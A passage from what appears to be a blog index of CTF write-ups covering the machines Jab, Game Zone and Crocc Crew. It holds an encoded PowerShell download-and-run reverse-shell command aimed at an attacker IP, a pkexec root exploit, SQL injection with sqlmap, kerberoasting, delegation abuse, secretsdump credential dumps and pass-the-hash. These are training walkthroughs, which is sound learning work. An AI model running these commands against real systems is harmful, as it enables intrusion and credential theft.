SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAIgBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANgAuADEAOAAvAEkAbgB2AG8AawBlAC0AUABvAHcAZQByAFMAaABlAGwAbABUAGMAcAAuAHAAcwAxACIAKQA= ```{: .nolineno}As a result I got the callback with a powershell shell â¬![Image](Pasted%20image%2020240424130825.png)_dcomexec.py working_Lets enumerate further more ðŸ”»```powershellPS C:\\windows\\system32> cd C:\\UsersPS C:\\Users> dir Directory: C:\\UsersMode LastWriteTime Length Name ---- ------------- ------ ---- d----- 11/21/2023 11:52 AM Administrator d-r--- 10/23/2023 12:12 PM Public d----- 1/22/2024 1:36 PM svc_openfire PS C:\\Users> cd svc_openfirePS C:\\Users\\svc_openfire> tree /f /aFolder PATH listingVolume serial number is E59D-A256C:.+---3D Objects+---Contacts+---Desktop| user.txt| +---Documents+---Downloads+---Favorites| | Bing.url| | | \\---Links+---Links| Desktop.lnk| Downloads.lnk| +---Music+---Pictures+---Saved Games+---Searches\\---VideosPS C:\\Users\\svc_openfire> type Desktop\\user.txt1ff49870849826eee7849a1bbd7610e1PS C:\\Users\\svc_openfire>```{: .nolineno}I checked the network ports and got one port suspicious that is port 9090 .```powershellPS C:\\windows\\system32> netstat -ano```{: .nolineno}![Image](Pasted%20image%2020240424211318.png)_Port 9090 looks suspicious lets look into it_Lets access this port through port forwarding , I will be using chisel to do so .![Image](Pasted%20image%2020240425220856.png)_Chisel Tool 9090 port forwarded to port 9090 of host machine_I get this openfire login page â¬![Image](Pasted%20image%2020240425220912.png)_Openfire Login Page with version 4.7.5_With svc_openfire creds I got logged in into the site â¬![Image](Pasted%20image%2020240425221256.png)_Dashboard of openfire_After that I did some digging and got an exploit related to this version that is â¬##### [CVE-2023-32315 - Path Traversal in Openfire leads to RCE](https://www.vicarius.io/vsociety/posts/cve-2023-32315-path-traversal-in-openfire-leads-to-rce)### Step ðŸ”»1. Run exploit2. login with newly added user3. goto tab plugin > upload pluginÂ `openfire-management-tool-plugin.jar`4. goto tab server > server settings > Management tool5. Access websehll with password \"123\"Lets follow these steps â¬![Image](Pasted%20image%2020240425221651.png)_Upload the jar file that is downloadable from the above exploit_![Image](Pasted%20image%2020240425223252.png)_Execute command_For reverse shell I used the command that I used previously during dcomexec.py Tool execution.```powershellpowershell -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAIgBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANgAuADEAOAAvAEkAbgB2AG8AawBlAC0AUABvAHcAZQByAFMAaABlAGwAbABUAGMAcAAuAHAAcwAxACIAKQA=```{: .nolineno}![Image](Pasted%20image%2020240425224923.png)In return to that I got the reverse shell ,don't forget to turn on the python http server to upload the Invoke-PowerShellTcp.ps1 file.```powershellâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Jab/CVE-2023-32315]â””â”€$ rlwrap nc -lvnp 445 listening on [any] 445 ...connect to [10.10.16.18] from (UNKNOWN) [10.10.11.4] 53923Windows PowerShell running as user DC01$ on DC01Copyright (C) 2015 Microsoft Corporation. All rights reserved.PS C:\\Program Files\\Openfire\\bin>whoamint authority\\systemPS C:\\Program Files\\Openfire\\bin> cd C:\\Users\\AdministratorPS C:\\Users\\Administrator> tree /f /aFolder PATH listingVolume serial number is E59D-A256C:.+---3D Objects+---Contacts+---Desktop| root.txt| +---Documents+---Downloads+---Favorites| | Bing.url| | | \\---Links+---Links| Desktop.lnk| Downloads.lnk| +---Music| cleanup.ps1|......+---Pictures+---Saved Games+---Searches\\---VideosPS C:\\Users\\Administrator> cat Desktop\\root.txt27ab3011623ce98619c9753574570f8bPS C:\\Users\\Administrator> ```{: .nolineno}I am Administrator Now !!> If you have any questions or suggestions, please leave a comment below.> Thank You ! {: .prompt-tip }" }, { "title": "Game Zone", "url": "/posts/Game-Zone/", "categories": "TryHackMe", "tags": "pkexec, PrivEsc, SQLi, sqlmap, SUIDs, Port Forwarding, Webmin, CMS, Metasploit", "date": "2024-04-27 00:00:00 +0530", "snippet": "| Machine Link | [https://tryhackme.com/r/room/gamezone](https://tryhackme.com/r/room/gamezone) || ------------------ | -----------------------------------------------------------------------...", "content": "| Machine Link | [https://tryhackme.com/r/room/gamezone](https://tryhackme.com/r/room/gamezone) || ------------------ | ------------------------------------------------------------------------------ || Operating System | Linux || Difficulty | Easy || Machine Created by | [SecurityNomad](https://tryhackme.com/p/SecurityNomad) |## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/Game_Zone]â””â”€$ sudo nmap -sC -sV -T4 -oN Nmap_Results.txt -Pn -vv 10.10.42.22Nmap scan report for 10.10.42.22Host is up, received user-set (0.17s latency).Scanned at 2024-04-10 08:46:19 IST for 22sNot shown: 998 closed tcp ports (reset)PORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 61:ea:89:f1:d4:a7:dc:a5:50:f7:6d:89:c3:af:0b:03 (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDFJTi0lKi0G+v4eFQU+P+CBodBOruOQC+3C/nXv0JVeR7yDWH6iRsFsevDofWcq05MZBr/CDPCnluhZzM1psx+5bp1Eiv3ecO0PF1QjhAzsPwUcmFSG1zAg+S757M+RFeRs0Jw0WMev8N6aR3uBZQSDPwBHGps+mZZZRcsssckJGQCZ4Qg/6PVFIwNGx9UoftdMFyfNMU/TDZmoatzo/FNEJOhbR38dF/xw9s/HRhugrUsLdNHyBxYShcY3B0Y2eLjnnuUWhYPmLZqgHuHr+eKnb1Ae3MB5lJTfZf3OmWaqcDVI3wpvQK7ACC9S8nxL3vYLyzxlvucEZHM9ILBI7Ov| 256 b3:7d:72:46:1e:d3:41:b6:6a:91:15:16:c9:4a:a5:fa (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKAU0Orx0zOb8C4AtiV+Q1z2yj1DKw5Z2TA2UTS9Ee1AYJcMtM62+f7vGCgoTNN3eFj3lTvktOt+nMYsipuCxdY=| 256 53:67:09:dc:ff:fb:3a:3e:fb:fe:cf:d8:6d:41:27:ab (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIL6LScmHgHeP2OMerYFiDsNPqgqFbsL+GsyehB76kldy80/tcp open http syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))| http-methods: |_ Supported Methods: GET POST OPTIONS| http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set|_http-server-header: Apache/2.4.18 (Ubuntu)|_http-title: Game ZoneService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel```{: .nolineno}{: file='Nmap_Results.txt' .nolineno}## Web Enumeration â¤µï¸While checking port 80 I got this static page â¬![Image](Pasted%20image%2020240410091722.png)_Front Page_Now I did the directory or files bruteforcing and found this `portal.php` page that looks like searchable page so I tried SQLi with sqlmap Tool and got this result â¬![Image](Pasted%20image%2020240410091910.png)_portal.php page_Request parameters are ðŸ”»![Image](Pasted%20image%2020240410092013.png)_Burpsuite Resquest and Response Page_```bashsudo sqlmap -r portal_searchitem.txt --dump -D mysql```{: .nolineno}I saved this request page into a file called `portal_searchitem.txt` file â¬![Image](Pasted%20image%2020240410092312.png)_sqlmap Tool_This site is vulnerable to â¬![Image](Pasted%20image%2020240410092431.png)_SQLi Vulnerabilities_I got this db Database from above enumeration and used that into sqlmap to dump some more data like this â¬```bashsudo sqlmap -r portal_searchitem.txt --dump --dbms=mysql --dbs db -T users```{: .nolineno}![Image](Pasted%20image%2020240410095250.png)_sqlmap result of above command_Now lets crack this hash and get our password and for that I used John the ripper Tool or you can use this [site](https://hashes.com/en/decrypt/hash) to crack this hash it is very helpful when comes to cracking hashes .```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/Game_Zone]â””â”€$ john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt --format=Raw-SHA256Using default input encoding: UTF-8Loaded 1 password hash (Raw-SHA256 [SHA256 256/256 AVX2 8x])Warning: poor OpenMP scalability for this hash type, consider --fork=2Will run 2 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for status (?) 1g 0:00:00:01 DONE (2024-04-10 09:55) 0.5813g/s 1695Kp/s 1695Kc/s 1695KC/sUse the \"--show --format=Raw-SHA256\" options to display all of the cracked passwords reliablySession completed. ```{: .nolineno}Now I have the credentials of user **agent47** so lets try for SSH access â¬### SSH SHELL ðŸ”½```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/Game_Zone]â””â”€$ ssh agent47@10.10.42.22 The authenticity of host '10.10.42.22 (10.10.42.22)' can not be established.ED25519 key fingerprint is SHA256:CyJgMM67uFKDbNbKyUM0DexcI+LWun63SGLfBvqQcLA.This key is not known by any other names.Are you sure you want to continue connecting (yes/no/[fingerprint])? yesWarning: Permanently added '10.10.42.22' (ED25519) to the list of known hosts.agent47@10.10.42.22s password: Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-159-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage109 packages can be updated.68 updates are security updates.Last login: Fri Aug 16 17:52:04 2019 from 192.168.1.147agent47@gamezone:~$ whoamiagent47agent47@gamezone:~$ iduid=1000(agent47) gid=1000(agent47) groups=1000(agent47),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)agent47@gamezone:~$```{: .nolineno}I checked for SUIDs permissions and I got pkexec as SUID permitted so lets see its version â¬```bashagent47@gamezone:~$ find / -perm -u=s -type f 2>/dev/null/usr/bin/newgrp/usr/bin/passwd/usr/bin/chsh/usr/bin/newuidmap/usr/bin/chfn/usr/bin/gpasswd/usr/bin/newgidmap/usr/bin/pkexec/usr/bin/at/usr/bin/sudo/usr/lib/dbus-1.0/dbus-daemon-launch-helper/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic/usr/lib/snapd/snap-confine/usr/lib/openssh/ssh-keysign/usr/lib/eject/dmcrypt-get-device/usr/lib/policykit-1/polkit-agent-helper-1/bin/ntfs-3g/bin/umount/bin/fusermount/bin/mount/bin/ping/bin/su/bin/ping6agent47@gamezone:~$agent47@gamezone:~$ /usr/bin/pkexec --versionpkexec version 0.105agent47@gamezone:~$ which python3/usr/bin/python3agent47@gamezone:~$```{: .nolineno}Since pkexec is vulnerable so lets upload a payload that will exploit this vulnerability â¬```bashagent47@gamezone:~$ wget http://10.11.75.200/pkexec_CVE-2021-4034.py--2024-04-09 23:30:48-- http://10.11.75.200/pkexec_CVE-2021-4034.pyConnecting to 10.11.75.200:80... connected.HTTP request sent, awaiting response... 200 OKLength: 3067 (3.0K) [text/x-python]Saving to: â€˜pkexec_CVE-2021-4034.pyâ€™pkexec_CVE-202 100%[====>] 3.00K --.-KB/s in 0.1s 2024-04-09 23:30:49 (28.2 KB/s) - â€˜pkexec_CVE-2021-4034.pyâ€™ saved [3067/3067]agent47@gamezone:~$ chmod +x pkexec_CVE-2021-4034.py agent47@gamezone:~$ agent47@gamezone:~$ python3 pkexec_CVE-2021-4034.py Do you want to choose a custom payload? y/n (n use default payload) n[+] Cleaning pervious exploiting attempt (if exist)[+] Creating shared library for exploit code.[+] Finding a libc library to call execve[+] Found a library at [+] Call execve() with chosen payload[+] Enjoy your root shell# whoamiroot# cd /root# /bin/bash -iroot@gamezone:/root# ls -altotal 24drwx------ 3 root root 4096 Aug 16 2019 .drwxr-xr-x 23 root root 4096 Aug 16 2019 ..lrwxrwxrwx 1 root root 9 Aug 16 2019 .bash_history -> /dev/null-rw-r--r-- 1 root root 3106 Oct 22 2015 .bashrcdrwx------ 2 root root 4096 Aug 16 2019 .cache-rw-r--r-- 1 root root 148 Aug 17 2015 .profile-rw-r--r-- 1 root root 33 Aug 16 2019 root.txtroot@gamezone:/root# cat root.txtFLAG_FLAG_FLAG_FLAG_FLAGroot@gamezone:/root# ```{: .nolineno}I am root Now !!This was unintended way lets so it with intended way and for that I checked for network ports and found this â¬```bashagent47@gamezone:/opt$ ss -tunlpNetid State Recv-Q Send-Q Local Address:Port Peer Address:Port udp UNCONN 0 0 *:10000 *:* udp UNCONN 0 0 *:68 *:* tcp LISTEN 0 128 *:22 *:* tcp LISTEN 0 80 127.0.0.1:3306 *:* tcp LISTEN 0 128 *:10000 *:* tcp LISTEN 0 128 :::22 :::* tcp LISTEN 0 128 :::80 :::* agent47@gamezone:/opt$ ```{: .nolineno}Since port 10000 is listening so accessing it I need to do port forwording and for that I used SSH command with flag -L that lets me listen on my host machine and its command goes like this â¬```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/Game_Zone]â””â”€$ ssh -L 10000:localhost:10000 agent47@10.10.42.22agent47@10.10.42.22s password: Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-159-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage109 packages can be updated.68 updates are security updates.Last login: Tue Apr 9 23:27:56 2024 from 10.11.75.200agent47@gamezone:~$ ```{: .nolineno}I loaded this site on my attacker machine and I got this â¬![Image](Pasted%20image%2020240410101756.png)_Login page_I entered the **agent47** users credentials and I got in â¬![Image](Pasted%20image%2020240410101854.png)_Webmin CMS site and its version is 1.580_I recon further about its vulnerability of its version and I got one ðŸ”»https://www.exploit-db.com/exploits/21851I started metasploit and ran this exploit ðŸ”»![Image](Pasted%20image%2020240410105800.png)_Webmin Exploit on metasploit module_remember to disable the SSL like this â¬```bashmsf6 exploit(unix/webapp/webmin_show_cgi_exec) > set SSL falseSSL => falsemsf6 exploit(unix/webapp/webmin_show_cgi_exec) > ```{: .nolineno}Now after filling all the details lets run this exploit and get our root shell â¬![Image](Pasted%20image%2020240410105646.png)_exploit ran_Now I am root !!> If you have any questions or suggestions, please leave a comment below.> Thank You ! {: .prompt-tip }" }, { "title": "Crocc Crew", "url": "/posts/Crocc-Crew/", "categories": "TryHackMe", "tags": "ASREPRoast, Active Directory, AllowedToDelegate, BloodHound, Kerberosting, PrivEsc, rdesktop, constrained_delegation, GetST.py, secretsdump, netexec, lookupsid.py", "date": "2024-04-27 00:00:00 +0530", "snippet": "| Machine Link | [https://tryhackme.com/r/room/crocccrew](https://tryhackme.com/r/room/crocccrew) || ------------------ | ---------------------------------------------------------------------...", "content": "| Machine Link | [https://tryhackme.com/r/room/crocccrew](https://tryhackme.com/r/room/crocccrew) || ------------------ | -------------------------------------------------------------------------------- || Operating System | Windows (Active Directory) || Difficulty | Insane || Machine Created by | [tryhackme](https://tryhackme.com/p/tryhackme) |## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/crocc_crew]â””â”€$ sudo nmap -sC -sV -T4 -oN Nmap_Results.txt 10.10.251.254 -Pn[sudo] password for kali: Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-04 08:59 ISTNmap scan report for 10.10.251.254Host is up (0.18s latency).Not shown: 987 filtered tcp ports (no-response)PORT STATE SERVICE VERSION53/tcp open domain Simple DNS Plus80/tcp open http Microsoft IIS httpd 10.0|_http-server-header: Microsoft-IIS/10.0| http-methods: |_ Potentially risky methods: TRACE88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-04-04 03:29:45Z)135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: COOCTUS.CORP0., Site: Default-First-Site-Name)445/tcp open microsoft-ds?464/tcp open kpasswd5?593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0636/tcp open tcpwrapped3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: COOCTUS.CORP0., Site: Default-First-Site-Name)3269/tcp open tcpwrapped3389/tcp open ms-wbt-server Microsoft Terminal Services| ssl-cert: Subject: commonName=DC.COOCTUS.CORP| Not valid before: 2024-04-03T03:28:51|_Not valid after: 2024-10-03T03:28:51|_ssl-date: 2024-04-04T03:31:02+00:00; 0s from scanner time.| rdp-ntlm-info: | Target_Name: COOCTUS| NetBIOS_Domain_Name: COOCTUS| NetBIOS_Computer_Name: DC| DNS_Domain_Name: COOCTUS.CORP| DNS_Computer_Name: DC.COOCTUS.CORP| Product_Version: 10.0.17763|_ System_Time: 2024-04-04T03:30:03+00:00Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:| smb2-security-mode: | 3:1:1: |_ Message signing enabled and required| smb2-time: | date: 2024-04-04T03:30:06|_ start_date: N/A```{: .nolineno}{: file='Nmap_Results.txt' .nolineno}## Web Enumeration â¤µï¸When I checked port 80 I got this page ðŸ”»![Image](Pasted%20image%2020240404090641.png)_Front Page_While Enumeration I got this `robots.txt` file that gives me some more files â¬![Image](Pasted%20image%2020240404130703.png)_robots.txt file_I checked `/backdoor.php` file it only takes input with hello keyword along with only 1 arguments and print it with rest of the text like this â¬![Image](Pasted%20image%2020240404130826.png)_backdoor.php page_I checked its source code and got this result â¬![Image](Pasted%20image%2020240404130854.png)_source code of backdoor.php page_Now I looked into `db-config.bak` file that contains the credentials of a user â¬![Image](Pasted%20image%2020240404091938.png)_db-config.bak page_Lets go for RDP access I tried RDP with Userless access through rdesktop Tool.```bashrdesktop -r 10.10.182.217```{: .nolineno}I get this user session login sessions and the background image indicates some credentials so I copied it and tried to login with that but I got the following response.![Image](Pasted%20image%2020240404101239.png)_Userless RDP session with rdesktop Tool_Response I got from Visitor user Login trial : ![Image](Pasted%20image%2020240404101459.png)_Visitor Login trial_Lets see what visitor can do with netexec Tool ðŸ”½![Image](Pasted%20image%2020240404131523.png)_netexec SMB + RDP updates_Now lets look into the Shares with netexec only with using spider_plus as a module like this : ![Image](Pasted%20image%2020240404132050.png)_netexec with spider_plus module_I got this output â¬![Image](Pasted%20image%2020240404132206.png)_Smb Shares data_Lets access user.txt share with smbclient Tool â¬![Image](Pasted%20image%2020240404132530.png)_smbclient Tool_Since this user also have `IPC$` share read access so lets do RID cycling with lookupsid.py Tool from impackets.```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/crocc_crew]â””â”€$ python3 /opt/Tools/impacket/examples/lookupsid.py Visitor@cooctus.corpImpacket v0.11.0 - Copyright 2023 FortraPassword:[*] Brute forcing SIDs at cooctus.corp[*] StringBinding ncacn_np:cooctus.corp[\\pipe\\lsarpc][*] Domain SID is: S-1-5-21-2062199590-3607821280-2073525473498: COOCTUS\\Enterprise Read-only Domain Controllers (SidTypeGroup)500: COOCTUS\\Administrator (SidTypeUser)501: COOCTUS\\Guest (SidTypeUser)502: COOCTUS\\krbtgt (SidTypeUser)512: COOCTUS\\Domain Admins (SidTypeGroup)513: COOCTUS\\Domain Users (SidTypeGroup)514: COOCTUS\\Domain Guests (SidTypeGroup)515: COOCTUS\\Domain Computers (SidTypeGroup)516: COOCTUS\\Domain Controllers (SidTypeGroup)517: COOCTUS\\Cert Publishers (SidTypeAlias)518: COOCTUS\\Schema Admins (SidTypeGroup)519: COOCTUS\\Enterprise Admins (SidTypeGroup)520: COOCTUS\\Group Policy Creator Owners (SidTypeGroup)521: COOCTUS\\Read-only Domain Controllers (SidTypeGroup)522: COOCTUS\\Cloneable Domain Controllers (SidTypeGroup)525: COOCTUS\\Protected Users (SidTypeGroup)526: COOCTUS\\Key Admins (SidTypeGroup)527: COOCTUS\\Enterprise Key Admins (SidTypeGroup)553: COOCTUS\\RAS and IAS Servers (SidTypeAlias)571: COOCTUS\\Allowed RODC Password Replication Group (SidTypeAlias)572: COOCTUS\\Denied RODC Password Replication Group (SidTypeAlias)1000: COOCTUS\\DC$ (SidTypeUser)1101: COOCTUS\\DnsAdmins (SidTypeAlias)1102: COOCTUS\\DnsUpdateProxy (SidTypeGroup)1109: COOCTUS\\Visitor (SidTypeUser)1115: COOCTUS\\mark (SidTypeUser)1116: COOCTUS\\Jeff (SidTypeUser)1117: COOCTUS\\Spooks (SidTypeUser)1118: COOCTUS\\RDP-Users (SidTypeGroup)1119: COOCTUS\\Steve (SidTypeUser)1120: COOCTUS\\Howard (SidTypeUser)1121: COOCTUS\\admCroccCrew (SidTypeUser)1122: COOCTUS\\Fawaz (SidTypeUser)1123: COOCTUS\\karen (SidTypeUser)1124: COOCTUS\\cryillic (SidTypeUser)1125: COOCTUS\\yumeko (SidTypeUser)1126: COOCTUS\\pars (SidTypeUser)1127: COOCTUS\\kevin (SidTypeUser)1128: COOCTUS\\jon (SidTypeUser)1129: COOCTUS\\Varg (SidTypeUser)1130: COOCTUS\\evan (SidTypeUser)1131: COOCTUS\\Ben (SidTypeUser)1132: COOCTUS\\David (SidTypeUser)1134: COOCTUS\\password-reset (SidTypeUser)1135: COOCTUS\\PC-Joiner (SidTypeGroup)1136: COOCTUS\\VPN Access (SidTypeGroup)1137: COOCTUS\\Server Users (SidTypeGroup)1138: COOCTUS\\Restrict DC Login (SidTypeGroup)1139: COOCTUS\\East Coast (SidTypeGroup)1140: COOCTUS\\West Coast (SidTypeGroup)1141: COOCTUS\\File Server Access (SidTypeGroup)1142: COOCTUS\\File Server Admins (SidTypeGroup)1143: COOCTUS\\MSSQL Admins (SidTypeGroup)1144: COOCTUS\\MSSQL Access (SidTypeGroup)```{: .nolineno}I sorted this list and save them in a file users.txt and looked for some TGT tickets with as-rep-roasting method through GetNPUsers.py Tool from impackets but noluck . ```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/crocc_crew]â””â”€$ /opt/Tools/impacket/examples/GetNPUsers.py -no-pass 'cooctus.corp/' -dc-ip 10.10.182.217 -request -usersfile users.txtImpacket v0.11.0 - Copyright 2023 Fortra[-] User Administrator does not have UF_DONT_REQUIRE_PREAUTH set[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)[-] User DC$ does not have UF_DONT_REQUIRE_PREAUTH set[-] User Visitor does not have UF_DONT_REQUIRE_PREAUTH set[-] User mark does not have UF_DONT_REQUIRE_PREAUTH set[-] User Jeff does not have UF_DONT_REQUIRE_PREAUTH set[-] User Spooks does not have UF_DONT_REQUIRE_PREAUTH set[-] User Steve does not have UF_DONT_REQUIRE_PREAUTH set[-] User Howard does not have UF_DONT_REQUIRE_PREAUTH set[-] User admCroccCrew does not have UF_DONT_REQUIRE_PREAUTH set[-] User Fawaz does not have UF_DONT_REQUIRE_PREAUTH set[-] User karen does not have UF_DONT_REQUIRE_PREAUTH set[-] User cryillic does not have UF_DONT_REQUIRE_PREAUTH set[-] User yumeko does not have UF_DONT_REQUIRE_PREAUTH set[-] User pars does not have UF_DONT_REQUIRE_PREAUTH set[-] User kevin does not have UF_DONT_REQUIRE_PREAUTH set[-] User jon does not have UF_DONT_REQUIRE_PREAUTH set[-] User Varg does not have UF_DONT_REQUIRE_PREAUTH set[-] User evan does not have UF_DONT_REQUIRE_PREAUTH set[-] User Ben does not have UF_DONT_REQUIRE_PREAUTH set[-] User David does not have UF_DONT_REQUIRE_PREAUTH set[-] User password-reset does not have UF_DONT_REQUIRE_PREAUTH set```{: .nolineno}Now lets look into kerberostable SPN tickets with Visitor user credentials with netexec Tool this time like this â¬```bashnetexec ldap 10.10.182.217 -u Visitor -p '' --kerberoasting spn.txt```{: .nolineno}![Image](Pasted%20image%2020240404134635.png)_netexec kerberostable SPN ticket alternative of `GetUsersSPN.py` from impackets_Lets crack this SPN ticket for `password-reset` account with John-The-Ripper Tool â¬![Image](Pasted%20image%2020240404134932.png)_John-the-ripper Tool_Lets start bloodhound now with password-reset Users credentials like this â¬```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/crocc_crew]â””â”€$ bloodhound-python -u 'password-reset' -p '' -ns 10.10.182.217 -d cooctus.corp -c allINFO: Found AD domain: cooctus.corpINFO: Getting TGT for userINFO: Connecting to LDAP server: dc.cooctus.corpINFO: Found 1 domainsINFO: Found 1 domains in the forestINFO: Found 1 computersINFO: Connecting to GC LDAP server: dc.cooctus.corpINFO: Connecting to LDAP server: dc.cooctus.corpINFO: Found 17 usersINFO: Found 63 groupsINFO: Found 2 gposINFO: Found 11 ousINFO: Found 19 containersINFO: Found 0 trustsINFO: Starting computer enumeration with 10 workersINFO: Querying computer: DC.COOCTUS.CORPINFO: Done in 00M 49S```{: .nolineno}![Image](Pasted%20image%2020240404143758.png)_Bloodhound Data Analysis_For AllowedToDelegate Privileges to Abuse ,which means that I means user password-reset can impersonate to another user like this â¬![Image](Pasted%20image%2020240404143926.png)_AllowedToDelegate privileges_```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/crocc_crew]â””â”€$ python3 /opt/Tools/impacket/examples/getST.py -spn 'oakley/DC' -dc-ip 10.10.180.93 -impersonate 'Administrator' 'cooctus.corp/password-reset:KRB5CCNAME .```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/crocc_crew]â””â”€$ export KRB5CCNAME=Administrator@oakley_DC@COOCTUS.CORP.ccache ```{: .nolineno}Now it is exported lets extract the secrets through secretsdump Tool from impacket like this â¬```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/crocc_crew]â””â”€$ impacket-secretsdump -no-pass -k dc Impacket v0.11.0 - Copyright 2023 Fortra[*] Service RemoteRegistry is in stopped state[*] Starting service RemoteRegistry[*] Target system bootKey: 0xe748a0def7614d3306bd536cdc51bebe[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)Administrator:500:aad3b435b51404eeaad3b435b51404ee:7dfa0531d73101ca080........1c7:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae..........0c089c0:::DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesnt have hash information.[*] Dumping cached domain logon information (domain/username:hash)[*] Dumping LSA Secrets[*] $MACHINE.ACC COOCTUS\\DC$:plain_password_hex:ba0fdf2439a8aa435e22682ae391f03d7029b22371649eb26fa4134fdec948dba579a319ce114da1126d88c141339b6312b8027f4bc4a5f57a71d36ba61d7aa4bc31fd6c6948aa5fc287c7aba63383e8201c9799ecb1df3022be30ea334d8de4f7b1dda251bde864388cb502ab4b0fda4273431a437efd1a341ff21a174ba141f82c55b3a7a85d9f556931902b5664f10af29bef75806276eec4bb6be28a16ca095e300f25816d09aaf10c2fbec79ebe1cf5917bf79e059c87185d8a340e84b2f8819918f5a09bd030da3a4f26c91d66d1363ecf98ac5a1d537751b130f758c0565e9e53a1af803........2c7320COOCTUS\\DC$:aad3b435b51404eeaad3b435b51404ee:fa8e768b7015f2511be........062787:::[*] DPAPI_SYSTEM dpapi_machinekey:0xdadf91990ade51602422e8283bad7a4771ca859bdpapi_userkey:0x95ca7d2a7ae7ce38f20f1b11c22a05e5e23b321b[*] NL$KM 0000 D5 05 74 5F A7 08 35 EA EC 25 41 2C 20 DC 36 0C ..t_..5..%A, .6. 0010 AC CE CB 12 8C 13 AC 43 58 9C F7 5C 88 E4 7A C3 .......CX..\\..z. 0020 98 F2 BB EC 5F CB 14 63 1D 43 8C 81 11 1E 51 EC ...._..c.C....Q. 0030 66 07 6D FB 19 C4 2C 0E 9A 07 30 2A 90 27 2C 6B f.m...,...0*.,kNL$KM:d505745fa70835eaec25412c20dc360caccecb128c13ac43589cf75c88e47ac398f2bbec5fcb14631d438c81111e51ec66076dfb19c42c0e9a07302a90272c6b[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)[*] Using the DRSUAPI method to get NTDS.DIT secretsAdministrator:500:aad3b435b51404eeaad3b435b51404ee:ad....................022d:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d4609747................797e:::COOCTUS.CORP\\Visitor:1109:aad3b435b51404eeaad3b435b51404ee:87..................912cb2e9e97bbb1:::COOCTUS.CORP\\mark:1115:aad3b435b51404eeaad3b435b51404ee:0b5e04d90d..................0848244ef:::COOCTUS.CORP\\Jeff:1116:aad3b435b51404eeaad3b435b51404ee:1004ed2b099.............3cc9b7:::...```{: .nolineno}Lets **Pass-the-Hash** and get the shell of Administrator like this ðŸ”»```powershellâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/crocc_crew]â””â”€$ evil-winrm -i 10.10.180.93 -u Administrator -H Evil-WinRM shell v3.5 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Info: Establishing connection to remote endpoint*Evil-WinRM* PS C:\\Users\\Administrator\\Documents> cd ..*Evil-WinRM* PS C:\\Users\\Administrator> whoamicooctus\\administrator*Evil-WinRM* PS C:\\Users\\Administrator> tree /f /aFolder PATH listingVolume serial number is 1296-13D1C:.+---3D Objects+---Contacts+---Desktop+---Documents+---Downloads+---Favorites| | 